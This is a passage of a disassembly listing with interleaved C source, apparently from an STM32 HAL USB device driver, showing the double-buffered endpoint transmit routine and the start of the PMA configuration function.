 800355a:	4413      	add	r3, r2
 800355c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003560:	881b      	ldrh	r3, [r3, #0]
 8003562:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003566:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 800356a:	68bb      	ldr	r3, [r7, #8]
 800356c:	699a      	ldr	r2, [r3, #24]
 800356e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003572:	429a      	cmp	r2, r3
 8003574:	d307      	bcc.n	8003586 <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 8003576:	68bb      	ldr	r3, [r7, #8]
 8003578:	699a      	ldr	r2, [r3, #24]
 800357a:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800357e:	1ad2      	subs	r2, r2, r3
 8003580:	68bb      	ldr	r3, [r7, #8]
 8003582:	619a      	str	r2, [r3, #24]
 8003584:	e002      	b.n	800358c <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 8003586:	68bb      	ldr	r3, [r7, #8]
 8003588:	2200      	movs	r2, #0
 800358a:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 800358c:	68bb      	ldr	r3, [r7, #8]
 800358e:	699b      	ldr	r3, [r3, #24]
 8003590:	2b00      	cmp	r3, #0
 8003592:	f040 80c0 	bne.w	8003716 <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003596:	68bb      	ldr	r3, [r7, #8]
 8003598:	785b      	ldrb	r3, [r3, #1]
 800359a:	2b00      	cmp	r3, #0
 800359c:	d126      	bne.n	80035ec <HAL_PCD_EP_DB_Transmit+0x47a>
 800359e:	68fb      	ldr	r3, [r7, #12]
 80035a0:	681b      	ldr	r3, [r3, #0]
 80035a2:	67fb      	str	r3, [r7, #124]	; 0x7c
 80035a4:	68fb      	ldr	r3, [r7, #12]
 80035a6:	681b      	ldr	r3, [r3, #0]
 80035a8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80035ac:	b29b      	uxth	r3, r3
 80035ae:	461a      	mov	r2, r3
 80035b0:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80035b2:	4413      	add	r3, r2
 80035b4:	67fb      	str	r3, [r7, #124]	; 0x7c
 80035b6:	68bb      	ldr	r3, [r7, #8]
 80035b8:	781b      	ldrb	r3, [r3, #0]
 80035ba:	00da      	lsls	r2, r3, #3
 80035bc:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80035be:	4413      	add	r3, r2
 80035c0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80035c4:	67bb      	str	r3, [r7, #120]	; 0x78
 80035c6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80035c8:	881b      	ldrh	r3, [r3, #0]
 80035ca:	b29b      	uxth	r3, r3
 80035cc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80035d0:	b29a      	uxth	r2, r3
 80035d2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80035d4:	801a      	strh	r2, [r3, #0]
 80035d6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80035d8:	881b      	ldrh	r3, [r3, #0]
 80035da:	b29b      	uxth	r3, r3
 80035dc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035e0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035e4:	b29a      	uxth	r2, r3
 80035e6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80035e8:	801a      	strh	r2, [r3, #0]
 80035ea:	e01a      	b.n	8003622 <HAL_PCD_EP_DB_Transmit+0x4b0>
 80035ec:	68bb      	ldr	r3, [r7, #8]
 80035ee:	785b      	ldrb	r3, [r3, #1]
 80035f0:	2b01      	cmp	r3, #1
 80035f2:	d116      	bne.n	8003622 <HAL_PCD_EP_DB_Transmit+0x4b0>
 80035f4:	68fb      	ldr	r3, [r7, #12]
 80035f6:	681b      	ldr	r3, [r3, #0]
 80035f8:	667b      	str	r3, [r7, #100]	; 0x64
 80035fa:	68fb      	ldr	r3, [r7, #12]
 80035fc:	681b      	ldr	r3, [r3, #0]
 80035fe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003602:	b29b      	uxth	r3, r3
 8003604:	461a      	mov	r2, r3
 8003606:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003608:	4413      	add	r3, r2
 800360a:	667b      	str	r3, [r7, #100]	; 0x64
 800360c:	68bb      	ldr	r3, [r7, #8]
 800360e:	781b      	ldrb	r3, [r3, #0]
 8003610:	00da      	lsls	r2, r3, #3
 8003612:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003614:	4413      	add	r3, r2
 8003616:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800361a:	663b      	str	r3, [r7, #96]	; 0x60
 800361c:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 800361e:	2200      	movs	r2, #0
 8003620:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003622:	68fb      	ldr	r3, [r7, #12]
 8003624:	681b      	ldr	r3, [r3, #0]
 8003626:	677b      	str	r3, [r7, #116]	; 0x74
 8003628:	68bb      	ldr	r3, [r7, #8]
 800362a:	785b      	ldrb	r3, [r3, #1]
 800362c:	2b00      	cmp	r3, #0
 800362e:	d12b      	bne.n	8003688 <HAL_PCD_EP_DB_Transmit+0x516>
 8003630:	68fb      	ldr	r3, [r7, #12]
 8003632:	681b      	ldr	r3, [r3, #0]
 8003634:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003636:	68fb      	ldr	r3, [r7, #12]
 8003638:	681b      	ldr	r3, [r3, #0]
 800363a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800363e:	b29b      	uxth	r3, r3
 8003640:	461a      	mov	r2, r3
 8003642:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003644:	4413      	add	r3, r2
 8003646:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003648:	68bb      	ldr	r3, [r7, #8]
 800364a:	781b      	ldrb	r3, [r3, #0]
 800364c:	00da      	lsls	r2, r3, #3
 800364e:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003650:	4413      	add	r3, r2
 8003652:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003656:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 800365a:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800365e:	881b      	ldrh	r3, [r3, #0]
 8003660:	b29b      	uxth	r3, r3
 8003662:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003666:	b29a      	uxth	r2, r3
 8003668:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800366c:	801a      	strh	r2, [r3, #0]
 800366e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003672:	881b      	ldrh	r3, [r3, #0]
 8003674:	b29b      	uxth	r3, r3
 8003676:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800367a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800367e:	b29a      	uxth	r2, r3
 8003680:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003684:	801a      	strh	r2, [r3, #0]
 8003686:	e017      	b.n	80036b8 <HAL_PCD_EP_DB_Transmit+0x546>
 8003688:	68bb      	ldr	r3, [r7, #8]
 800368a:	785b      	ldrb	r3, [r3, #1]
 800368c:	2b01      	cmp	r3, #1
 800368e:	d113      	bne.n	80036b8 <HAL_PCD_EP_DB_Transmit+0x546>
 8003690:	68fb      	ldr	r3, [r7, #12]
 8003692:	681b      	ldr	r3, [r3, #0]
 8003694:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003698:	b29b      	uxth	r3, r3
 800369a:	461a      	mov	r2, r3
 800369c:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800369e:	4413      	add	r3, r2
 80036a0:	677b      	str	r3, [r7, #116]	; 0x74
 80036a2:	68bb      	ldr	r3, [r7, #8]
 80036a4:	781b      	ldrb	r3, [r3, #0]
 80036a6:	00da      	lsls	r2, r3, #3
 80036a8:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 80036aa:	4413      	add	r3, r2
 80036ac:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80036b0:	673b      	str	r3, [r7, #112]	; 0x70
 80036b2:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 80036b4:	2200      	movs	r2, #0
 80036b6:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 80036b8:	68bb      	ldr	r3, [r7, #8]
 80036ba:	781b      	ldrb	r3, [r3, #0]
 80036bc:	4619      	mov	r1, r3
 80036be:	68f8      	ldr	r0, [r7, #12]
 80036c0:	f009 fa69 	bl	800cb96 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 80036c4:	88fb      	ldrh	r3, [r7, #6]
 80036c6:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80036ca:	2b00      	cmp	r3, #0
 80036cc:	f040 811a 	bne.w	8003904 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80036d0:	68fb      	ldr	r3, [r7, #12]
 80036d2:	681b      	ldr	r3, [r3, #0]
 80036d4:	461a      	mov	r2, r3
 80036d6:	68bb      	ldr	r3, [r7, #8]
 80036d8:	781b      	ldrb	r3, [r3, #0]
 80036da:	009b      	lsls	r3, r3, #2
 80036dc:	4413      	add	r3, r2
 80036de:	881b      	ldrh	r3, [r3, #0]
 80036e0:	b29b      	uxth	r3, r3
 80036e2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80036e6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80036ea:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 80036ee:	68fb      	ldr	r3, [r7, #12]
 80036f0:	681b      	ldr	r3, [r3, #0]
 80036f2:	461a      	mov	r2, r3
 80036f4:	68bb      	ldr	r3, [r7, #8]
 80036f6:	781b      	ldrb	r3, [r3, #0]
 80036f8:	009b      	lsls	r3, r3, #2
 80036fa:	441a      	add	r2, r3
 80036fc:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 8003700:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003704:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003708:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800370c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003710:	b29b      	uxth	r3, r3
 8003712:	8013      	strh	r3, [r2, #0]
 8003714:	e0f6      	b.n	8003904 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003716:	88fb      	ldrh	r3, [r7, #6]
 8003718:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800371c:	2b00      	cmp	r3, #0
 800371e:	d121      	bne.n	8003764 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003720:	68fb      	ldr	r3, [r7, #12]
 8003722:	681b      	ldr	r3, [r3, #0]
 8003724:	461a      	mov	r2, r3
 8003726:	68bb      	ldr	r3, [r7, #8]
 8003728:	781b      	ldrb	r3, [r3, #0]
 800372a:	009b      	lsls	r3, r3, #2
 800372c:	4413      	add	r3, r2
 800372e:	881b      	ldrh	r3, [r3, #0]
 8003730:	b29b      	uxth	r3, r3
 8003732:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003736:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800373a:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 800373e:	68fb      	ldr	r3, [r7, #12]
 8003740:	681b      	ldr	r3, [r3, #0]
 8003742:	461a      	mov	r2, r3
 8003744:	68bb      	ldr	r3, [r7, #8]
 8003746:	781b      	ldrb	r3, [r3, #0]
 8003748:	009b      	lsls	r3, r3, #2
 800374a:	441a      	add	r2, r3
 800374c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8003750:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003754:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003758:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800375c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003760:	b29b      	uxth	r3, r3
 8003762:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003764:	68bb      	ldr	r3, [r7, #8]
 8003766:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800376a:	2b01      	cmp	r3, #1
 800376c:	f040 80ca 	bne.w	8003904 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 8003770:	68bb      	ldr	r3, [r7, #8]
 8003772:	695a      	ldr	r2, [r3, #20]
 8003774:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003778:	441a      	add	r2, r3
 800377a:	68bb      	ldr	r3, [r7, #8]
 800377c:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800377e:	68bb      	ldr	r3, [r7, #8]
 8003780:	69da      	ldr	r2, [r3, #28]
 8003782:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003786:	441a      	add	r2, r3
 8003788:	68bb      	ldr	r3, [r7, #8]
 800378a:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 800378c:	68bb      	ldr	r3, [r7, #8]
 800378e:	6a1a      	ldr	r2, [r3, #32]
 8003790:	68bb      	ldr	r3, [r7, #8]
 8003792:	691b      	ldr	r3, [r3, #16]
 8003794:	429a      	cmp	r2, r3
 8003796:	d30b      	bcc.n	80037b0 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 8003798:	68bb      	ldr	r3, [r7, #8]
 800379a:	691b      	ldr	r3, [r3, #16]
 800379c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 80037a0:	68bb      	ldr	r3, [r7, #8]
 80037a2:	6a1a      	ldr	r2, [r3, #32]
 80037a4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80037a8:	1ad2      	subs	r2, r2, r3
 80037aa:	68bb      	ldr	r3, [r7, #8]
 80037ac:	621a      	str	r2, [r3, #32]
 80037ae:	e017      	b.n	80037e0 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 80037b0:	68bb      	ldr	r3, [r7, #8]
 80037b2:	6a1b      	ldr	r3, [r3, #32]
 80037b4:	2b00      	cmp	r3, #0
 80037b6:	d108      	bne.n	80037ca <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 80037b8:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80037bc:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 80037c0:	68bb      	ldr	r3, [r7, #8]
 80037c2:	2200      	movs	r2, #0
 80037c4:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80037c8:	e00a      	b.n	80037e0 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 80037ca:	68bb      	ldr	r3, [r7, #8]
 80037cc:	6a1b      	ldr	r3, [r3, #32]
 80037ce:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 80037d2:	68bb      	ldr	r3, [r7, #8]
 80037d4:	2200      	movs	r2, #0
 80037d6:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 80037d8:	68bb      	ldr	r3, [r7, #8]
 80037da:	2200      	movs	r2, #0
 80037dc:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80037e0:	68fb      	ldr	r3, [r7, #12]
 80037e2:	681b      	ldr	r3, [r3, #0]
 80037e4:	657b      	str	r3, [r7, #84]	; 0x54
 80037e6:	68bb      	ldr	r3, [r7, #8]
 80037e8:	785b      	ldrb	r3, [r3, #1]
 80037ea:	2b00      	cmp	r3, #0
 80037ec:	d165      	bne.n	80038ba <HAL_PCD_EP_DB_Transmit+0x748>
 80037ee:	68fb      	ldr	r3, [r7, #12]
 80037f0:	681b      	ldr	r3, [r3, #0]
 80037f2:	65fb      	str	r3, [r7, #92]	; 0x5c
 80037f4:	68fb      	ldr	r3, [r7, #12]
 80037f6:	681b      	ldr	r3, [r3, #0]
 80037f8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80037fc:	b29b      	uxth	r3, r3
 80037fe:	461a      	mov	r2, r3
 8003800:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003802:	4413      	add	r3, r2
 8003804:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003806:	68bb      	ldr	r3, [r7, #8]
 8003808:	781b      	ldrb	r3, [r3, #0]
 800380a:	00da      	lsls	r2, r3, #3
 800380c:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800380e:	4413      	add	r3, r2
 8003810:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003814:	65bb      	str	r3, [r7, #88]	; 0x58
 8003816:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003818:	881b      	ldrh	r3, [r3, #0]
 800381a:	b29b      	uxth	r3, r3
 800381c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003820:	b29a      	uxth	r2, r3
 8003822:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003824:	801a      	strh	r2, [r3, #0]
 8003826:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800382a:	2b3e      	cmp	r3, #62	; 0x3e
 800382c:	d91d      	bls.n	800386a <HAL_PCD_EP_DB_Transmit+0x6f8>
 800382e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003832:	095b      	lsrs	r3, r3, #5
 8003834:	66bb      	str	r3, [r7, #104]	; 0x68
 8003836:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800383a:	f003 031f 	and.w	r3, r3, #31
 800383e:	2b00      	cmp	r3, #0
 8003840:	d102      	bne.n	8003848 <HAL_PCD_EP_DB_Transmit+0x6d6>
 8003842:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003844:	3b01      	subs	r3, #1
 8003846:	66bb      	str	r3, [r7, #104]	; 0x68
 8003848:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800384a:	881b      	ldrh	r3, [r3, #0]
 800384c:	b29a      	uxth	r2, r3
 800384e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003850:	b29b      	uxth	r3, r3
 8003852:	029b      	lsls	r3, r3, #10
 8003854:	b29b      	uxth	r3, r3
 8003856:	4313      	orrs	r3, r2
 8003858:	b29b      	uxth	r3, r3
 800385a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800385e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003862:	b29a      	uxth	r2, r3
 8003864:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003866:	801a      	strh	r2, [r3, #0]
 8003868:	e041      	b.n	80038ee <HAL_PCD_EP_DB_Transmit+0x77c>
 800386a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800386e:	2b00      	cmp	r3, #0
 8003870:	d10a      	bne.n	8003888 <HAL_PCD_EP_DB_Transmit+0x716>
 8003872:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003874:	881b      	ldrh	r3, [r3, #0]
 8003876:	b29b      	uxth	r3, r3
 8003878:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800387c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003880:	b29a      	uxth	r2, r3
 8003882:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003884:	801a      	strh	r2, [r3, #0]
 8003886:	e032      	b.n	80038ee <HAL_PCD_EP_DB_Transmit+0x77c>
 8003888:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800388c:	085b      	lsrs	r3, r3, #1
 800388e:	66bb      	str	r3, [r7, #104]	; 0x68
 8003890:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003894:	f003 0301 	and.w	r3, r3, #1
 8003898:	2b00      	cmp	r3, #0
 800389a:	d002      	beq.n	80038a2 <HAL_PCD_EP_DB_Transmit+0x730>
 800389c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800389e:	3301      	adds	r3, #1
 80038a0:	66bb      	str	r3, [r7, #104]	; 0x68
 80038a2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80038a4:	881b      	ldrh	r3, [r3, #0]
 80038a6:	b29a      	uxth	r2, r3
 80038a8:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80038aa:	b29b      	uxth	r3, r3
 80038ac:	029b      	lsls	r3, r3, #10
 80038ae:	b29b      	uxth	r3, r3
 80038b0:	4313      	orrs	r3, r2
 80038b2:	b29a      	uxth	r2, r3
 80038b4:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80038b6:	801a      	strh	r2, [r3, #0]
 80038b8:	e019      	b.n	80038ee <HAL_PCD_EP_DB_Transmit+0x77c>
 80038ba:	68bb      	ldr	r3, [r7, #8]
 80038bc:	785b      	ldrb	r3, [r3, #1]
 80038be:	2b01      	cmp	r3, #1
 80038c0:	d115      	bne.n	80038ee <HAL_PCD_EP_DB_Transmit+0x77c>
 80038c2:	68fb      	ldr	r3, [r7, #12]
 80038c4:	681b      	ldr	r3, [r3, #0]
 80038c6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80038ca:	b29b      	uxth	r3, r3
 80038cc:	461a      	mov	r2, r3
 80038ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80038d0:	4413      	add	r3, r2
 80038d2:	657b      	str	r3, [r7, #84]	; 0x54
 80038d4:	68bb      	ldr	r3, [r7, #8]
 80038d6:	781b      	ldrb	r3, [r3, #0]
 80038d8:	00da      	lsls	r2, r3, #3
 80038da:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80038dc:	4413      	add	r3, r2
 80038de:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80038e2:	653b      	str	r3, [r7, #80]	; 0x50
 80038e4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80038e8:	b29a      	uxth	r2, r3
 80038ea:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80038ec:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 80038ee:	68fb      	ldr	r3, [r7, #12]
 80038f0:	6818      	ldr	r0, [r3, #0]
 80038f2:	68bb      	ldr	r3, [r7, #8]
 80038f4:	6959      	ldr	r1, [r3, #20]
 80038f6:	68bb      	ldr	r3, [r7, #8]
 80038f8:	895a      	ldrh	r2, [r3, #10]
 80038fa:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80038fe:	b29b      	uxth	r3, r3
 8003900:	f004 fee7 	bl	80086d2 <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 8003904:	68fb      	ldr	r3, [r7, #12]
 8003906:	681b      	ldr	r3, [r3, #0]
 8003908:	461a      	mov	r2, r3
 800390a:	68bb      	ldr	r3, [r7, #8]
 800390c:	781b      	ldrb	r3, [r3, #0]
 800390e:	009b      	lsls	r3, r3, #2
 8003910:	4413      	add	r3, r2
 8003912:	881b      	ldrh	r3, [r3, #0]
 8003914:	b29b      	uxth	r3, r3
 8003916:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800391a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800391e:	82bb      	strh	r3, [r7, #20]
 8003920:	8abb      	ldrh	r3, [r7, #20]
 8003922:	f083 0310 	eor.w	r3, r3, #16
 8003926:	82bb      	strh	r3, [r7, #20]
 8003928:	8abb      	ldrh	r3, [r7, #20]
 800392a:	f083 0320 	eor.w	r3, r3, #32
 800392e:	82bb      	strh	r3, [r7, #20]
 8003930:	68fb      	ldr	r3, [r7, #12]
 8003932:	681b      	ldr	r3, [r3, #0]
 8003934:	461a      	mov	r2, r3
 8003936:	68bb      	ldr	r3, [r7, #8]
 8003938:	781b      	ldrb	r3, [r3, #0]
 800393a:	009b      	lsls	r3, r3, #2
 800393c:	441a      	add	r2, r3
 800393e:	8abb      	ldrh	r3, [r7, #20]
 8003940:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003944:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003948:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800394c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003950:	b29b      	uxth	r3, r3
 8003952:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 8003954:	2300      	movs	r3, #0
}
 8003956:	4618      	mov	r0, r3
 8003958:	3790      	adds	r7, #144	; 0x90
 800395a:	46bd      	mov	sp, r7
 800395c:	bd80      	pop	{r7, pc}

0800395e <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 800395e:	b480      	push	{r7}
 8003960:	b087      	sub	sp, #28
 8003962:	af00      	add	r7, sp, #0
 8003964:	60f8      	str	r0, [r7, #12]
 8003966:	607b      	str	r3, [r7, #4]
 8003968:	460b      	mov	r3, r1
 800396a:	817b      	strh	r3, [r7, #10]
 800396c:	4613      	mov	r3, r2
 800396e:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 8003970:	897b      	ldrh	r3, [r7, #10]
 8003972:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8003976:	b29b      	uxth	r3, r3
 8003978:	2b00      	cmp	r3, #0
 800397a:	d00b      	beq.n	8003994 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800397c:	897b      	ldrh	r3, [r7, #10]
 800397e:	f003 0307 	and.w	r3, r3, #7
 8003982:	1c5a      	adds	r2, r3, #1
 8003984:	4613      	mov	r3, r2
 8003986:	009b      	lsls	r3, r3, #2
 8003988:	4413      	add	r3, r2
 800398a:	00db      	lsls	r3, r3, #3
 800398c:	68fa      	ldr	r2, [r7, #12]
 800398e:	4413      	add	r3, r2
 8003990:	617b      	str	r3, [r7, #20]
 8003992:	e009      	b.n	80039a8 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8003994:	897a      	ldrh	r2, [r7, #10]
 8003996:	4613      	mov	r3, r2
 8003998:	009b      	lsls	r3, r3, #2
 800399a:	4413      	add	r3, r2
 800399c:	00db      	lsls	r3, r3, #3
 800399e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80039a2:	68fa      	ldr	r2, [r7, #12]
 80039a4:	4413      	add	r3, r2
 80039a6:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 80039a8:	893b      	ldrh	r3, [r7, #8]
 80039aa:	2b00      	cmp	r3, #0
 80039ac:	d107      	bne.n	80039be <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 80039ae:	697b      	ldr	r3, [r7, #20]
 80039b0:	2200      	movs	r2, #0
 80039b2:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 80039b4:	687b      	ldr	r3, [r7, #4]
 80039b6:	b29a      	uxth	r2, r3
 80039b8:	697b      	ldr	r3, [r7, #20]
 80039ba:	80da      	strh	r2, [r3, #6]
 80039bc:	e00b      	b.n	80039d6 <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 80039be:	697b      	ldr	r3, [r7, #20]
 80039c0:	2201      	movs	r2, #1
 80039c2:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 80039c4:	687b      	ldr	r3, [r7, #4]
 80039c6:	b29a      	uxth	r2, r3
 80039c8:	697b      	ldr	r3, [r7, #20]
 80039ca:	811a      	strh	r2, [r3, #8]
